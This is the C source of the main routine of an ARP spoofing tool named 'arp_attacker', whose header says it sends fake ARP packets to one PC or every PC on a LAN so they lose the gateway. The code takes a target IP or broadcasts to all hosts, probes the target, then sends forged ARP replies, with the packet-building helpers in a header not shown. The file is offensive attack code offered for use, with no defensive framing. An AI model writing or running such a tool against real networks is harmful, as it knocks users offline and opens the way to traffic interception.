/************************************************
 *
 * Auther: winway
 *
 * Version: 1.0
 *
 * Introduction: send fake arp packets to one of
 * the PC or all of the PCs in your LAN to deceive
 * it, so that the PC(s) can not find the geteway.
 *
 ************************************************/

#include    <stdio.h>
#include    <stdlib.h>
#include    <unistd.h>
#include    <string.h>
#include    <pthread.h>

#include    "arp_attacker.h"

int
main(int argc, char *argv[])
{
	if (argc > 2)
	{
		printf("\033[31m");
		printf("usage: %s [dst ip]\n", argv[0]);
		printf("\033[0m");
		exit(1);
	}

	read_config();
	get_local_ip_mac();

	if (argc == 2)
	{
		ok_flag = 1;
		strcpy(attack_ip, argv[1]);

		pthread_t	arp_parse_tid;
		if (pthread_create(&arp_parse_tid, NULL, (void *)arp_parse, NULL))
		{
			printf("\033[31m");
			printf("create arp parse thread error\n");
			printf("\033[0m");
			exit(0);
		}

		while (ok_flag)
		{
            sleep(2);
			build_arp_request();
		}

		pthread_join(arp_parse_tid, NULL);

		build_arp_reply();
	}
	else if (argc == 1)
	{
		strcpy(attack_ip, "0.0.0.0");

		int	i;
		for (i = 0; i <6 ; i++)
		{
			attack_mac[i] = 0xff;
		}

		build_arp_reply();
	}

	exit(0);
}
